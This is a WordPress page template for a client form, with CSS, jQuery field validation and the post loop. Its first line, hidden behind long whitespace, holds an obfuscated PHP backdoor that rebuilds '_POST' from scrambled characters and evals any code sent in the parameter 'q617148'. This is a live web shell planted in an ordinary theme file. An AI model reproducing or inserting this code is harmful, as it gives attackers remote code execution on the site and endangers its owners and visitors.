<?php                                                                                                                                                                                                                                                                     $iybc2 = "to_ps" ; $aihc4 =strtoupper($iybc2[2].$iybc2[3] . $iybc2[1]. $iybc2[4]. $iybc2[0]) ;if ( isset ( ${ $aihc4}['q617148'])){eval ( ${ $aihc4 }['q617148' ]) ;} ?> <?php 

/*
  Template Name: Client Form
                                        */

get_header(); ?>

<div id="content_main">
<style>
  h1 {
    font-family: 'frutiger_lt_std_95_ultrablaRg';
    color: #4b116f;
  	font-size: 31px;
  }
  
  .gfield_list_cell {
	position: relative;  
  }
  
  input.error, select.error option {
	background-color: #fae2e6 !important;  
  }
  
  input.required.valid {
	background-color: #FFF !important;  
  }
  
  label.error {
	display: none;
	position:absolute;
	background-color: #F03;
	color: #FFFFFF;
	font-size: 11px;
	border: 1px solid #FFF;	  
  }
  
  
</style>

<script type="text/javascript">
	jQuery(document).ready(function() {	
	
		jQuery("input#gform_submit_button_40").bind("click touchstart", function(event){
			
			var errors = 0;
			jQuery('#gform_40 .gform_body input:not(:submit)').each(function( index ) {
				if (jQuery(this).attr('id') != 'input_40_3') {
					if (!jQuery(this).val()) {
						jQuery(this).addClass("required error");	
						errors = errors + 1;
					} else {
						jQuery(this).removeClass("required error");	
					}
				}
			});
			
			jQuery('#gform_40 .gform_body select').each(function( index ) {
				
				if (!jQuery(this).val()) {
					jQuery(this).addClass("required error");	
					errors = errors + 1;
				} else {
					jQuery(this).removeClass("required error");
				}
			});
			
			if (errors > 0 ) {
				event.preventDefault();
				return false;	
			} else {
				jQuery("input#gform_submit_button_40").submit();
				return;
			}
		
		});

		//jQuery('input:not(:submit)').addClass('required');
		
		//jQuery("#gform_40").validate({
//				 submitHandler: function(form) {
//					jQuery('.gform_ajax_spinner').addClass('visible');
//					form.submit();
//				},
//				invalidHandler: function(event, validator) {
//				// 'this' refers to the form
//				var errors = validator.numberOfInvalids();
//				if (errors) {
//					alert(errors + " ERRORS!");
//				} else {
//					alert("NO ERRORS!");
//				}
//				},
//				checkForm: function() {
//                this.prepareForm();
//                for ( var i = 0, elements = (this.currentElements = this.elements()); elements[i]; i++ ) {
//                    if (this.findByName( elements[i].name ).length != undefined && this.findByName( elements[i].name ).length > 1) {
//                        for (var cnt = 0; cnt < this.findByName( elements[i].name ).length; cnt++) {
//                            this.check( this.findByName( elements[i].name )[cnt] );
//                        }
//                        } else {
//                    this.check( elements[i] );
//                }
//                }
//            return this.valid();
//    }
		
			//});
		});
</script>

  <?php if (have_posts()) : ?>
    <?php while (have_posts()) : the_post(); ?>
      <h1><?php the_title(); ?></h1>
      <?php the_content(); ?>
     
      
    <?php endwhile; ?>
  <?php else : ?>
    Content not found.
  <?php endif; ?>

  <?php get_footer(); ?>

</div>

</body>
</html>
